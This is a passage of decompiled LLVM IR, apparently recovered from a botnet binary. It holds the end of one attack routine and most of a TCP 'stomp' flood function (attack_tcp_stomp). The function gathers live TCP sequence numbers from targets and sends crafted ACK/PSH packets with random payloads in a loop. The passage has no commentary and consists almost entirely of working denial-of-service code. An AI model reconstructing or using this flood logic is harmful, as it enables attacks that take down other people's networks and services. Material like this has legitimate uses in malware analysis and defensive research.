  %v3_101a4 = add i32 %v2_ffb0, 36
  %v4_101a4 = inttoptr i32 %v3_101a4 to i16*
  store i16 0, i16* %v4_101a4, align 2
  %v1_101c4 = call i32 @__GI_htons(i32 %v3_101bc)
  %v1_101cc = trunc i32 %v1_101c4 to i16
  %v8_101e0 = call i16 @checksum_tcpudp(i32 %v2_ffb0, i8* %v4_ffc8, i16 %v1_101cc, i32 %fold)
  store i16 %v8_101e0, i16* %v4_101a4, align 2
  %v3_101f4 = load i32, i32* %fd_-104, align 4
  %v2_10200 = mul i32 %v3_101f4, 24
  %v2_1020c = add i32 %v2_10200, %targs
  %v1_10214 = add i32 %v2_ffb0, 22
  %v2_10214 = inttoptr i32 %v1_10214 to i16*
  %v3_10214 = load i16, i16* %v2_10214, align 2
  %v3_10218 = add i32 %v2_1020c, 2
  %v4_10218 = inttoptr i32 %v3_10218 to i16*
  store i16 %v3_10214, i16* %v4_10218, align 2
  %v3_10224 = load i32, i32* %fd_-104, align 4
  %v2_10230 = mul i32 %v3_10224, 24
  %v2_1023c = add i32 %v2_10230, %targs
  %v6_1025c = call i32 @__libc_sendto(i32 %v3_fb80, i32 %v2_ffb0, i32 %fold14, i32 16384, i32 %v2_1023c, i32 16)
  %v3_10260 = load i32, i32* %fd_-104, align 4
  %v1_10264 = add i32 %v3_10260, 1
  br label %dec_label_pc_1026c

dec_label_pc_1026c:                               ; preds = %dec_label_pc_ff90, %dec_label_pc_10170
  %v3_10000 = phi i32 [ 0, %dec_label_pc_ff90 ], [ %v1_10264, %dec_label_pc_10170 ]
  store i32 %v3_10000, i32* %fd_-104, align 4
  %sext13 = mul i32 %v3_10000, 16777216
  %v9_10278 = sdiv i32 %sext13, 16777216
  %v10_10278 = icmp sgt i32 %tmp32, %v9_10278
  br i1 %v10_10278, label %dec_label_pc_ff9c, label %dec_label_pc_ff90

dec_label_pc_10280:                               ; preds = %entry, %dec_label_pc_fbcc
  ret void

; uselistorder directives
  uselistorder i32 %v3_10000, { 0, 3, 1, 2 }
  uselistorder i32 %v2_ffb0, { 6, 3, 7, 4, 8, 9, 2, 1, 0, 10, 11, 5, 12, 13 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %v3_fbe4, { 0, 2, 1 }
  uselistorder i8* %v2_fde4, { 1, 2, 0, 3 }
  uselistorder i32 %fold14, { 1, 0 }
  uselistorder i32 %v3_fb80, { 2, 1, 3, 0 }
  uselistorder i32 %v9_faa0, { 1, 0 }
  uselistorder i32 %v9_fa1c, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %fd_-104, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 10, 9 }
  uselistorder i32 (i8, i32, i8, i32)* @attack_get_opt_ip, { 1, 0 }
  uselistorder label %dec_label_pc_10280, { 1, 0 }
  uselistorder label %dec_label_pc_1026c, { 1, 0 }
  uselistorder label %dec_label_pc_10170, { 1, 0 }
  uselistorder label %dec_label_pc_10158, { 1, 0 }
  uselistorder label %dec_label_pc_10134, { 1, 0 }
  uselistorder label %dec_label_pc_10110, { 1, 0 }
  uselistorder label %dec_label_pc_100e4, { 1, 0 }
  uselistorder label %dec_label_pc_100b8, { 1, 0 }
  uselistorder label %dec_label_pc_1008c, { 1, 0 }
  uselistorder label %dec_label_pc_10070, { 1, 0 }
  uselistorder label %dec_label_pc_ff80, { 1, 0 }
  uselistorder label %dec_label_pc_ff68, { 1, 0 }
  uselistorder label %dec_label_pc_fd14, { 1, 0 }
}

define void @attack_tcp_stomp(i8 %targs_len, i32 %targs, i8 %opts_len, i32 %opts) local_unnamed_addr {
entry:
  %tmp48 = sext i8 %targs_len to i32
  %tmp66 = call i8* @__decompiler_undefined_function_2()
  %tmp68 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-380 = alloca i32, align 4
  %recv_addr_-144 = alloca i32, align 4
  %pktbuf_-400 = alloca [256 x i8], align 1
  %recv_addr_-140 = alloca i32, align 4
  %addr_-124 = alloca i32, align 4
  %rfd_-108 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 66204, i32* %stack_var_-4, align 4
  %v2_10298 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10298, i32* @fp, align 4
  %v3_102c4 = call i32 @calloc(i32 %tmp48, i32 16)
  %v3_102dc = call i32 @calloc(i32 %tmp48, i32 4)
  %v9_102fc = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 2, i32 0)
  %v1_10304 = trunc i32 %v9_102fc to i8
  %v9_10320 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 3, i32 65535)
  %sext3 = mul i32 %v9_10320, 65536
  %v1_10324 = sdiv i32 %sext3, 65536
  %v1_10328 = trunc i32 %v1_10324 to i16
  %v9_10340 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 4, i32 64)
  %v1_10348 = trunc i32 %v9_10340 to i8
  %v9_10360 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 5, i32 1)
  %sext5 = mul i32 %v9_10360, 16777216
  %v1_10364 = sdiv i32 %sext5, 16777216
  %v1_10368 = trunc i32 %v1_10364 to i8
  %v9_10384 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 7, i32 65535)
  %v5_1038c = trunc i32 %v9_10384 to i8
  %v9_103a4 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 11, i32 0)
  %v9_103c4 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 12, i32 1)
  %v9_103e4 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 13, i32 1)
  %v9_10404 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 14, i32 0)
  %v9_10424 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 15, i32 0)
  %v9_10444 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 16, i32 0)
  %v9_10464 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 0, i32 768)
  %v9_10484 = call i32 @attack_get_opt_int(i8 %opts_len, i32 %opts, i8 1, i32 1)
  %sext12 = mul i32 %v9_10484, 16777216
  %v1_10488 = sdiv i32 %sext12, 16777216
  %v1_1048c = trunc i32 %v1_10488 to i8
  %v3_1049c = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_104ac = icmp eq i32 %v3_1049c, -1
  br i1 %v7_104ac, label %dec_label_pc_10e20, label %dec_label_pc_104b4

dec_label_pc_104b4:                               ; preds = %entry
  store i32 1, i32* %rfd_-108, align 4
  %v2_104bc = ptrtoint i32* %rfd_-108 to i32
  store i32 0, i32* @r1, align 4
  %v5_104d8 = call i32 @__GI_setsockopt(i32 %v3_1049c, i32 0, i32 3, i32 %v2_104bc, i32 4)
  %v3_104e0 = icmp eq i32 %v5_104d8, -1
  br i1 %v3_104e0, label %dec_label_pc_104e8, label %dec_label_pc_10c00.preheader

dec_label_pc_10c00.preheader:                     ; preds = %dec_label_pc_104b4
  %v4_10610 = sext i8 %v5_1038c to i16
  %v5_10610 = zext i16 %v4_10610 to i32
  %v3_1061c = icmp eq i8 %v5_1038c, -1
  %v2_10650 = ptrtoint i32* %addr_-124 to i32
  %v2_1067c = ptrtoint i32* %recv_addr_-140 to i32
  %v2_10680 = ptrtoint [256 x i8]* %pktbuf_-400 to i32
  %v2_10688 = ptrtoint i32* %recv_addr_-144 to i32
  %v2_106d8 = ptrtoint i32* %stack_var_-380 to i32
  %tmp108 = bitcast i32* %stack_var_-380 to i16*
  %v1_106f8 = add i32 %v2_106d8, 13
  %v2_106f8 = inttoptr i32 %v1_106f8 to i8*
  %v1_107e4 = add i32 %v9_10464, 40
  %v3_10894 = urem i32 %v1_107e4, 65536
  %v4_108b0 = urem i32 %v1_10324, 65536
  %v2_108dc = icmp eq i8 %v1_10368, 0
  %v1_10a44 = urem i32 %v9_103a4, 2
  %tmp = sub nsw i32 0, %v1_10a44
  %v3_10a60 = and i32 %tmp, 32
  %v1_10a7c = urem i32 %v9_103c4, 2
  %tmp117 = sub nsw i32 0, %v1_10a7c
  %v3_10a98 = and i32 %tmp117, 16
  %v1_10ab4 = urem i32 %v9_103e4, 2
  %tmp118 = sub nsw i32 0, %v1_10ab4
  %v3_10ad0 = and i32 %tmp118, 8
  %v1_10aec = urem i32 %v9_10404, 2
  %tmp119 = sub nsw i32 0, %v1_10aec
  %v1_10b24 = urem i32 %v9_10424, 2
  %tmp120 = sub nsw i32 0, %v1_10b24
  %v2_10b40 = and i32 %tmp120, 2
  %v1_10b5c = urem i32 %v9_10444, 2
  %v2_107c0 = add i32 %v3_102c4, 14
  br label %dec_label_pc_10c00

dec_label_pc_104e8:                               ; preds = %dec_label_pc_104b4
  %v1_104ec = call i32 @__GI___libc_close(i32 %v3_1049c)
  br label %dec_label_pc_10e20

dec_label_pc_10500:                               ; preds = %dec_label_pc_10c00, %dec_label_pc_10500.backedge
  %v3_1050c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1050c, i32* @r3, align 4
  %v7_1051c = icmp eq i32 %v3_1050c, -1
  br i1 %v7_1051c, label %dec_label_pc_10bf4, label %dec_label_pc_10524

dec_label_pc_10524:                               ; preds = %dec_label_pc_10500
  store i32 0, i32* @r2, align 4
  %v2_10530 = call i32 @__libc_fcntl(i32 %v3_1050c, i32 3)
  %v1_10538 = or i32 %v2_10530, 2048
  store i32 %v1_10538, i32* @r3, align 4
  store i32 %v1_10538, i32* @r2, align 4
  %v2_10548 = call i32 @__libc_fcntl(i32 %v3_1050c, i32 4)
  store i32 2, i32* %addr_-124, align 4
  %v3_10554 = load i32, i32* %rfd_-108, align 4
  %v2_10560 = mul i32 %v3_10554, 24
  %v2_1056c = add i32 %v2_10560, %targs
  %v1_10570 = add i32 %v2_1056c, 20
  %v2_10570 = inttoptr i32 %v1_10570 to i8*
  %v3_10570 = load i8, i8* %v2_10570, align 1
  %tmp121 = icmp ugt i8 %v3_10570, 31
  %v1_10608 = add i32 %v2_1056c, 16
  %v2_10608 = inttoptr i32 %v1_10608 to i32*
  %v3_10608 = load i32, i32* %v2_10608, align 4
  br i1 %tmp121, label %dec_label_pc_10610, label %dec_label_pc_1057c

dec_label_pc_1057c:                               ; preds = %dec_label_pc_10524
  %v1_105a0 = call i32 @__GI_ntohl(i32 %v3_10608)
  store i32 %v1_105a0, i32* @r4, align 4
  %v0_105a8 = call i32 @rand_next()
  %v3_105b0 = load i32, i32* %rfd_-108, align 4
  %v2_105bc = mul i32 %v3_105b0, 24
  %v2_105c8 = add i32 %v2_105bc, %targs
  %v1_105cc = add i32 %v2_105c8, 20
  %v2_105cc = inttoptr i32 %v1_105cc to i8*
  %v3_105cc = load i8, i8* %v2_105cc, align 1
  %v4_105cc = zext i8 %v3_105cc to i32
  %v6_105d0 = lshr i32 %v0_105a8, %v4_105cc
  %v0_105d4 = load i32, i32* @r4, align 4
  %v2_105d4 = add i32 %v0_105d4, %v6_105d0
  %v1_105dc = call i32 @__GI_htonl(i32 %v2_105d4)
  br label %dec_label_pc_10610

dec_label_pc_10610:                               ; preds = %dec_label_pc_10524, %dec_label_pc_1057c
  %storemerge26 = phi i32 [ %v1_105dc, %dec_label_pc_1057c ], [ %v3_10608, %dec_label_pc_10524 ]
  br i1 %v3_1061c, label %dec_label_pc_10624, label %dec_label_pc_1063c

dec_label_pc_10624:                               ; preds = %dec_label_pc_10610
  %v0_10624 = call i32 @rand_next()
  %extract.t = trunc i32 %v0_10624 to i16
  br label %dec_label_pc_10650

dec_label_pc_1063c:                               ; preds = %dec_label_pc_10610
  %v1_10644 = call i32 @__GI_htons(i32 %v5_10610)
  %extract.t116 = trunc i32 %v1_10644 to i16
  br label %dec_label_pc_10650

dec_label_pc_10650:                               ; preds = %dec_label_pc_10624, %dec_label_pc_1063c
  %v0_10624.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10624 ], [ %extract.t116, %dec_label_pc_1063c ]
  %v3_10660 = call i32 @__libc_connect(i32 %v3_1050c, i32 %v2_10650, i32 16)
  %v2_10668 = call i32 @__GI_time(i32* null)
  %v9_106c0 = icmp eq i32 %tmp68, %storemerge26
  br label %dec_label_pc_10674

dec_label_pc_10674:                               ; preds = %dec_label_pc_10bcc, %dec_label_pc_10650
  store i32 16, i32* %recv_addr_-144, align 4
  %v6_106a0 = call i32 @__libc_recvfrom(i32 %v3_1049c, i32 %v2_10680, i32 256, i32 16384, i32 %v2_1067c, i32 %v2_10688)
  %v7_106b0 = icmp eq i32 %v6_106a0, -1
  br i1 %v7_106b0, label %dec_label_pc_10e20, label %dec_label_pc_106b8

dec_label_pc_106b8:                               ; preds = %dec_label_pc_10674
  br i1 %v9_106c0, label %dec_label_pc_106c8, label %dec_label_pc_10bcc

dec_label_pc_106c8:                               ; preds = %dec_label_pc_106b8
  %tmp122 = icmp ult i32 %v6_106a0, 41
  br i1 %tmp122, label %dec_label_pc_10bcc, label %dec_label_pc_106d4

dec_label_pc_106d4:                               ; preds = %dec_label_pc_106c8
  %v2_106e4 = load i16, i16* %tmp108, align 4
  %v9_106ec = icmp eq i16 %v2_106e4, %v0_10624.sink.off0
  br i1 %v9_106ec, label %dec_label_pc_106f4, label %dec_label_pc_10bcc

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106d4
  %v3_106f8 = load i8, i8* %v2_106f8, align 1
  %v1_106fc = and i8 %v3_106f8, 2
  %v2_10700 = icmp eq i8 %v1_106fc, 0
  br i1 %v2_10700, label %dec_label_pc_10b98, label %dec_label_pc_10708

dec_label_pc_10708:                               ; preds = %dec_label_pc_106f4
  %v3_1070c = load i8, i8* %v2_106f8, align 1
  %v1_10710 = and i8 %v3_1070c, 16
  %v2_10714 = icmp eq i8 %v1_10710, 0
  br i1 %v2_10714, label %dec_label_pc_10b98, label %dec_label_pc_1071c

dec_label_pc_1071c:                               ; preds = %dec_label_pc_10708
  %v3_1071c = load i32, i32* %rfd_-108, align 4
  %v3_10720 = mul i32 %v3_1071c, 16
  %v2_1072c = add i32 %v3_10720, %v3_102c4
  %v2_10734 = inttoptr i32 %v2_1072c to i32*
  store i32 %tmp68, i32* %v2_10734, align 4
  %v3_10738 = load i32, i32* %rfd_-108, align 4
  %v3_1073c = mul i32 %v3_10738, 16
  %v2_10748 = add i32 %v3_1073c, %v3_102c4
  %v4_1074c = ptrtoint i8* %payload_-48.1 to i32
  %v1_10750 = add i32 %v4_1074c, 4
  %v2_10750 = inttoptr i32 %v1_10750 to i32*
  %v3_10750 = load i32, i32* %v2_10750, align 4
  %v1_10758 = call i32 @__GI_ntohl(i32 %v3_10750)
  %v2_10760 = add i32 %v2_10748, 4
  %v3_10760 = inttoptr i32 %v2_10760 to i32*
  store i32 %v1_10758, i32* %v3_10760, align 4
  %v3_10764 = load i32, i32* %rfd_-108, align 4
  %v3_10768 = mul i32 %v3_10764, 16
  %v2_10774 = add i32 %v3_10768, %v3_102c4
  %v1_1077c = add i32 %v4_1074c, 8
  %v2_1077c = inttoptr i32 %v1_1077c to i32*
  %v3_1077c = load i32, i32* %v2_1077c, align 4
  %v1_10784 = call i32 @__GI_ntohl(i32 %v3_1077c)
  %v2_1078c = add i32 %v2_10774, 8
  %v3_1078c = inttoptr i32 %v2_1078c to i32*
  store i32 %v1_10784, i32* %v3_1078c, align 4
  %v3_10790 = load i32, i32* %rfd_-108, align 4
  %v3_10794 = mul i32 %v3_10790, 16
  %v2_107a0 = add i32 %v3_10794, %v3_102c4
  %v1_107a8 = add i32 %v4_1074c, 2
  %v2_107a8 = inttoptr i32 %v1_107a8 to i16*
  %v3_107a8 = load i16, i16* %v2_107a8, align 2
  %v3_107ac = add i32 %v2_107a0, 12
  %v4_107ac = inttoptr i32 %v3_107ac to i16*
  store i16 %v3_107a8, i16* %v4_107ac, align 2
  %v3_107b0 = load i32, i32* %rfd_-108, align 4
  %v3_107b4 = mul i32 %v3_107b0, 16
  %v3_107c8 = add i32 %v2_107c0, %v3_107b4
  %v4_107c8 = inttoptr i32 %v3_107c8 to i16*
  store i16 %v0_10624.sink.off0, i16* %v4_107c8, align 2
  %v3_107cc = load i32, i32* %rfd_-108, align 4
  %v3_107d0 = mul i32 %v3_107cc, 4
  %v2_107dc = add i32 %v3_107d0, %v3_102dc
  store i32 %v2_107dc, i32* @r4, align 4
  %v1_107ec = call i32 @malloc(i32 %v1_107e4)
  %v1_107f4 = load i32, i32* @r4, align 4
  %v2_107f4 = inttoptr i32 %v1_107f4 to i32*
  store i32 %v1_107ec, i32* %v2_107f4, align 4
  %v3_107f8 = load i32, i32* %rfd_-108, align 4
  %v3_107fc = mul i32 %v3_107f8, 4
  %v2_10808 = add i32 %v3_107fc, %v3_102dc
  %v1_1080c = inttoptr i32 %v2_10808 to i32*
  %v2_1080c = load i32, i32* %v1_1080c, align 4
  %v5_10810 = inttoptr i32 %v2_1080c to i8*
  %v1_10818 = add i32 %v2_1080c, 20
  %v4_1081c = inttoptr i32 %v1_10818 to i8*
  %v1_10824 = add i32 %v2_1080c, 40
  %v4_10828 = inttoptr i32 %v1_10824 to i8*
  store i8 69, i8* %v5_10810, align 1
  %v3_1087c = add i32 %v2_1080c, 1
  %v4_1087c = inttoptr i32 %v3_1087c to i8*
  store i8 %v1_10304, i8* %v4_1087c, align 1
  %v1_1089c = call i32 @__GI_htons(i32 %v3_10894)
  %sext17 = mul i32 %v1_1089c, 65536
  %v1_108a0 = sdiv i32 %sext17, 65536
  %v1_108ac = trunc i32 %v1_108a0 to i16
  %v3_108ac = add i32 %v2_1080c, 2
  %v4_108ac = inttoptr i32 %v3_108ac to i16*
  store i16 %v1_108ac, i16* %v4_108ac, align 2
  %v1_108b8 = call i32 @__GI_htons(i32 %v4_108b0)
  %v1_108c8 = trunc i32 %v1_108b8 to i16
  %v3_108c8 = add i32 %v2_1080c, 4
  %v4_108c8 = inttoptr i32 %v3_108c8 to i16*
  store i16 %v1_108c8, i16* %v4_108c8, align 2
  %v3_108d4 = add i32 %v2_1080c, 8
  %v4_108d4 = inttoptr i32 %v3_108d4 to i8*
  store i8 %v1_10348, i8* %v4_108d4, align 1
  br i1 %v2_108dc, label %dec_label_pc_108fc, label %dec_label_pc_108e4

dec_label_pc_108e4:                               ; preds = %dec_label_pc_1071c
  %v1_108e8 = call i32 @__GI_htons(i32 16384)
  %sext19 = mul i32 %v1_108e8, 65536
  %v1_108ec = sdiv i32 %sext19, 65536
  %v1_108f8 = trunc i32 %v1_108ec to i16
  %v3_108f8 = add i32 %v2_1080c, 6
  %v4_108f8 = inttoptr i32 %v3_108f8 to i16*
  store i16 %v1_108f8, i16* %v4_108f8, align 2
  br label %dec_label_pc_108fc

dec_label_pc_108fc:                               ; preds = %dec_label_pc_1071c, %dec_label_pc_108e4
  %v3_10904 = add i32 %v2_1080c, 9
  %v4_10904 = inttoptr i32 %v3_10904 to i8*
  store i8 6, i8* %v4_10904, align 1
  %v2_1090c = load i32, i32* @LOCAL_ADDR, align 4
  %v2_10914 = add i32 %v2_1080c, 12
  %v3_10914 = inttoptr i32 %v2_10914 to i32*
  store i32 %v2_1090c, i32* %v3_10914, align 4
  %v3_10918 = load i32, i32* %rfd_-108, align 4
  %v3_1091c = mul i32 %v3_10918, 16
  %v2_10928 = add i32 %v3_1091c, %v3_102c4
  %v1_1092c = inttoptr i32 %v2_10928 to i32*
  %v2_1092c = load i32, i32* %v1_1092c, align 4
  %v2_10934 = add i32 %v2_1080c, 16
  %v3_10934 = inttoptr i32 %v2_10934 to i32*
  store i32 %v2_1092c, i32* %v3_10934, align 4
  %v3_10938 = load i32, i32* %rfd_-108, align 4
  %v3_1093c = mul i32 %v3_10938, 16
  %v2_10948 = add i32 %v3_1093c, %v3_102c4
  %v1_1094c = add i32 %v2_10948, 12
  %v2_1094c = inttoptr i32 %v1_1094c to i16*
  %v3_1094c = load i16, i16* %v2_1094c, align 2
  %v3_10954 = inttoptr i32 %v1_10818 to i16*
  store i16 %v3_1094c, i16* %v3_10954, align 2
  %v3_10958 = load i32, i32* %rfd_-108, align 4
  %v3_1095c = mul i32 %v3_10958, 16
  %v2_10968 = add i32 %v3_1095c, %v3_102c4
  %v1_1096c = add i32 %v2_10968, 14
  %v2_1096c = inttoptr i32 %v1_1096c to i16*
  %v3_1096c = load i16, i16* %v2_1096c, align 2
  %v3_10974 = add i32 %v2_1080c, 22
  %v4_10974 = inttoptr i32 %v3_10974 to i16*
  store i16 %v3_1096c, i16* %v4_10974, align 2
  %v3_10978 = load i32, i32* %rfd_-108, align 4
  %v3_1097c = mul i32 %v3_10978, 16
  %v2_10988 = add i32 %v3_1097c, %v3_102c4
  %v1_1098c = add i32 %v2_10988, 8
  %v2_1098c = inttoptr i32 %v1_1098c to i32*
  %v3_1098c = load i32, i32* %v2_1098c, align 4
  %v2_10994 = add i32 %v2_1080c, 24
  %v3_10994 = inttoptr i32 %v2_10994 to i32*
  store i32 %v3_1098c, i32* %v3_10994, align 4
  %v3_10998 = load i32, i32* %rfd_-108, align 4
  %v3_1099c = mul i32 %v3_10998, 16
  %v2_109a8 = add i32 %v3_1099c, %v3_102c4
  %v1_109ac = add i32 %v2_109a8, 4
  %v2_109ac = inttoptr i32 %v1_109ac to i32*
  %v3_109ac = load i32, i32* %v2_109ac, align 4
  %v2_109b4 = add i32 %v2_1080c, 28
  %v3_109b4 = inttoptr i32 %v2_109b4 to i32*
  store i32 %v3_109ac, i32* %v3_109b4, align 4
  %v1_109bc = add i32 %v2_1080c, 32
  %v2_109bc = inttoptr i32 %v1_109bc to i8*
  %v3_109bc = load i8, i8* %v2_109bc, align 1
  %tmp123 = urem i8 %v3_109bc, 16
  %v1_109cc = or i8 %tmp123, -128
  store i8 %v1_109cc, i8* %v2_109bc, align 1
  %v1_109e0 = add i32 %v2_1080c, 33
  %v2_109e0 = inttoptr i32 %v1_109e0 to i8*
  %v3_109e0 = load i8, i8* %v2_109e0, align 1
  %v1_10a14 = or i8 %v3_109e0, 17
  store i8 %v1_10a14, i8* %v2_109e0, align 1
  %v0_10a24 = call i32 @rand_next()
  %v1_10a38 = trunc i32 %v0_10a24 to i16
  %v3_10a38 = add i32 %v2_1080c, 34
  %v4_10a38 = inttoptr i32 %v3_10a38 to i16*
  store i16 %v1_10a38, i16* %v4_10a38, align 2
  %v3_10a4c = load i8, i8* %v2_109e0, align 1
  %v4_10a4c = zext i8 %v3_10a4c to i32
  %v1_10a5c = and i32 %v4_10a4c, 192
  %v2_10a64 = or i32 %v1_10a5c, %v3_10a60
  %v2_10a9c = or i32 %v2_10a64, %v3_10a98
  %v2_10ad4 = or i32 %v2_10a9c, %v3_10ad0
  %v3_10b08.masked.masked = and i32 %tmp119, 4
  %v1_10b3c.masked = or i32 %v2_10ad4, %v3_10b08.masked.masked
  %v1_10b74 = or i32 %v1_10b3c.masked, %v2_10b40
  %v2_10b78 = or i32 %v1_10b74, %v1_10b5c
  %v1_10b84 = trunc i32 %v2_10b78 to i8
  store i8 %v1_10b84, i8* %v2_109e0, align 1
  call void @rand_str(i8* %v4_10828, i32 %v9_10464)
  br label %dec_label_pc_10bf4

dec_label_pc_10b98:                               ; preds = %dec_label_pc_10708, %dec_label_pc_106f4
  %v3_10b9c = load i8, i8* %v2_106f8, align 1
  %tmp124 = urem i8 %v3_10b9c, 2
  %v2_10ba4 = icmp eq i8 %tmp124, 0
  br i1 %v2_10ba4, label %dec_label_pc_10bac, label %dec_label_pc_10bc0

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10b98
  %v3_10bb0 = load i8, i8* %v2_106f8, align 1
  %v1_10bb4 = and i8 %v3_10bb0, 4
  %v2_10bb8 = icmp eq i8 %v1_10bb4, 0
  br i1 %v2_10bb8, label %dec_label_pc_10bcc, label %dec_label_pc_10bc0

dec_label_pc_10bc0:                               ; preds = %dec_label_pc_10b98, %dec_label_pc_10bac
  %v1_10bc4 = call i32 @__GI___libc_close(i32 %v3_1050c)
  br label %dec_label_pc_10500.backedge

dec_label_pc_10500.backedge:                      ; preds = %dec_label_pc_10bc0, %dec_label_pc_10be8
  br label %dec_label_pc_10500

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_106d4, %dec_label_pc_106b8, %dec_label_pc_10bac, %dec_label_pc_106c8
  %v2_10bd0 = call i32 @__GI_time(i32* null)
  %v2_10bdc = sub i32 %v2_10bd0, %v2_10668
  %v7_10be4 = icmp slt i32 %v2_10bdc, 11
  br i1 %v7_10be4, label %dec_label_pc_10674, label %dec_label_pc_10be8

dec_label_pc_10be8:                               ; preds = %dec_label_pc_10bcc
  %v1_10bec = call i32 @__GI___libc_close(i32 %v3_1050c)
  br label %dec_label_pc_10500.backedge

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10500, %dec_label_pc_108fc
  %payload_-48.0 = phi i8* [ %v4_1081c, %dec_label_pc_108fc ], [ %payload_-48.1, %dec_label_pc_10500 ]
  %v3_10bf4 = load i32, i32* %rfd_-108, align 4
  %v1_10bf8 = add i32 %v3_10bf4, 1
  br label %dec_label_pc_10c00

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10c00.preheader, %dec_label_pc_10bf4
  %payload_-48.1 = phi i8* [ %payload_-48.0, %dec_label_pc_10bf4 ], [ %tmp66, %dec_label_pc_10c00.preheader ]
  %storemerge24 = phi i32 [ %v1_10bf8, %dec_label_pc_10bf4 ], [ 0, %dec_label_pc_10c00.preheader ]
  store i32 %storemerge24, i32* %rfd_-108, align 4
  %sext13 = mul i32 %storemerge24, 16777216
  %v9_10c0c = sdiv i32 %sext13, 16777216
  %v10_10c0c = icmp sgt i32 %tmp48, %v9_10c0c
  br i1 %v10_10c0c, label %dec_label_pc_10500, label %dec_label_pc_10c10.preheader

dec_label_pc_10c10.preheader:                     ; preds = %dec_label_pc_10c00
  %v3_10c64 = icmp eq i16 %v1_10328, -1
  %v2_10c88 = icmp eq i8 %v1_1048c, 0
  %fold = add i32 %v9_10464, 20
  %v3_10d5c = urem i32 %fold, 65536
  br label %dec_label_pc_10c10

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10e0c, %dec_label_pc_10c10.preheader
  br label %dec_label_pc_10e0c

dec_label_pc_10c1c:                               ; preds = %dec_label_pc_10e0c
  %v3_10c20 = mul i32 %v3_10c1c, 4
  %v2_10c2c = add i32 %v3_10c20, %v3_102dc
  %v1_10c30 = inttoptr i32 %v2_10c2c to i32*
  %v2_10c30 = load i32, i32* %v1_10c30, align 4
  %v1_10c44 = add i32 %v2_10c30, 20
  %v4_10c48 = inttoptr i32 %v1_10c44 to i8*
  %v1_10c50 = add i32 %v2_10c30, 40
  %v4_10c54 = inttoptr i32 %v1_10c50 to i8*
  br i1 %v3_10c64, label %dec_label_pc_10c6c, label %dec_label_pc_10c84

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10c1c
  %v0_10c6c = call i32 @rand_next()
  %v1_10c80 = trunc i32 %v0_10c6c to i16
  %v3_10c80 = add i32 %v2_10c30, 4
  %v4_10c80 = inttoptr i32 %v3_10c80 to i16*
  store i16 %v1_10c80, i16* %v4_10c80, align 2
  br label %dec_label_pc_10c84

dec_label_pc_10c84:                               ; preds = %dec_label_pc_10c1c, %dec_label_pc_10c6c
  br i1 %v2_10c88, label %dec_label_pc_10c9c, label %dec_label_pc_10c90

dec_label_pc_10c90:                               ; preds = %dec_label_pc_10c84
  call void @rand_str(i8* %v4_10c54, i32 %v9_10464)
  br label %dec_label_pc_10c9c

dec_label_pc_10c9c:                               ; preds = %dec_label_pc_10c84, %dec_label_pc_10c90
  %v3_10ca4 = add i32 %v2_10c30, 10
  %v4_10ca4 = inttoptr i32 %v3_10ca4 to i16*
  store i16 0, i16* %v4_10ca4, align 2
  %v1_10cac = inttoptr i32 %v2_10c30 to i16*
  %v5_10cb4 = call i16 @checksum_generic(i16* %v1_10cac, i32 20)
  store i16 %v5_10cb4, i16* %v4_10ca4, align 2
  %v3_10cc8 = load i32, i32* %rfd_-108, align 4
  %v3_10ccc = mul i32 %v3_10cc8, 16
  %v2_10cd8 = add i32 %v3_10ccc, %v3_102c4
  %v1_10cdc = add i32 %v2_10cd8, 4
  %v2_10cdc = inttoptr i32 %v1_10cdc to i32*
  %v3_10cdc = load i32, i32* %v2_10cdc, align 4
  %v3_10ce4 = urem i32 %v3_10cdc, 65536
  %v1_10ce8 = add i32 %v3_10cdc, 1
  store i32 %v1_10ce8, i32* %v2_10cdc, align 4
  %v1_10cf0 = call i32 @__GI_htons(i32 %v3_10ce4)
  %v2_10d00 = add i32 %v2_10c30, 24
  %v3_10d00 = inttoptr i32 %v2_10d00 to i32*
  store i32 %v1_10cf0, i32* %v3_10d00, align 4
  %v3_10d04 = load i32, i32* %rfd_-108, align 4
  %v3_10d08 = mul i32 %v3_10d04, 16
  %v2_10d14 = add i32 %v3_10d08, %v3_102c4
  %v1_10d18 = add i32 %v2_10d14, 8
  %v2_10d18 = inttoptr i32 %v1_10d18 to i32*
  %v3_10d18 = load i32, i32* %v2_10d18, align 4
  %v3_10d20 = urem i32 %v3_10d18, 65536
  %v1_10d28 = call i32 @__GI_htons(i32 %v3_10d20)
  %v2_10d38 = add i32 %v2_10c30, 28
  %v3_10d38 = inttoptr i32 %v2_10d38 to i32*
  store i32 %v1_10d28, i32* %v3_10d38, align 4
  %v3_10d44 = add i32 %v2_10c30, 36
  %v4_10d44 = inttoptr i32 %v3_10d44 to i16*
  store i16 0, i16* %v4_10d44, align 2
  %v1_10d64 = call i32 @__GI_htons(i32 %v3_10d5c)
  %v1_10d6c = trunc i32 %v1_10d64 to i16
  %v8_10d80 = call i16 @checksum_tcpudp(i32 %v2_10c30, i8* %v4_10c48, i16 %v1_10d6c, i32 %fold)
